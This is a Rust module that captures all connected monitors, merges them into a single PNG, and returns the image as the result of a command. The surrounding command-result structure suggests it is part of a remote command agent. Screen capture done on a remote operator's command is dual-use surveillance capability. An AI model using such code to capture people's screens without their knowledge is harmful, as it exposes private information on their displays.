//! Screenshot capture module
//!
//! Captures all monitors and combines them into a single image.

use image::codecs::png::PngEncoder;
use image::{ImageBuffer, ImageEncoder, Rgba, RgbaImage};
use uuid::Uuid;
use xcap::Monitor;

use super::CommandResult;

/// Capture all monitors and combine into a single image
pub fn capture_screenshot() -> CommandResult {
    // Get all monitors
    let monitors = match Monitor::all() {
        Ok(m) => m,
        Err(e) => return CommandResult::Error(format!("Failed to get monitors: {}", e)),
    };

    if monitors.is_empty() {
        return CommandResult::Error("No monitors found".to_string());
    }

    // Calculate bounding box for all monitors
    let (min_x, min_y, max_x, max_y) = calculate_bounding_box(&monitors);

    let total_width = (max_x - min_x) as u32;
    let total_height = (max_y - min_y) as u32;

    // Create combined image (black background)
    let mut combined: RgbaImage =
        ImageBuffer::from_pixel(total_width, total_height, Rgba([0, 0, 0, 255]));

    // Capture and place each monitor
    for monitor in &monitors {
        let img = match monitor.capture_image() {
            Ok(img) => img,
            Err(_e) => continue,
        };

        // Calculate position in combined image
        let x_offset = (monitor.x() - min_x) as u32;
        let y_offset = (monitor.y() - min_y) as u32;

        // Copy pixels to combined image
        for (x, y, pixel) in img.enumerate_pixels() {
            let dest_x = x_offset + x;
            let dest_y = y_offset + y;
            if dest_x < total_width && dest_y < total_height {
                combined.put_pixel(dest_x, dest_y, *pixel);
            }
        }
    }

    // Encode to PNG
    let mut buffer = Vec::new();
    let encoder = PngEncoder::new(&mut buffer);

    if let Err(e) = encoder.write_image(
        combined.as_raw(),
        total_width,
        total_height,
        image::ExtendedColorType::Rgba8,
    ) {
        return CommandResult::Error(format!("Failed to encode PNG: {}", e));
    }

    let filename = format!("scr_{}.png", Uuid::new_v4());

    CommandResult::BinaryOutput {
        data: buffer,
        filename,
        mime_type: "image/png".to_string(),
    }
}

/// Calculate the bounding box that contains all monitors
fn calculate_bounding_box(monitors: &[Monitor]) -> (i32, i32, i32, i32) {
    let mut min_x = i32::MAX;
    let mut min_y = i32::MAX;
    let mut max_x = i32::MIN;
    let mut max_y = i32::MIN;

    for monitor in monitors {
        let x = monitor.x();
        let y = monitor.y();
        let w = monitor.width() as i32;
        let h = monitor.height() as i32;

        min_x = min_x.min(x);
        min_y = min_y.min(y);
        max_x = max_x.max(x + w);
        max_y = max_y.max(y + h);
    }

    (min_x, min_y, max_x, max_y)
}
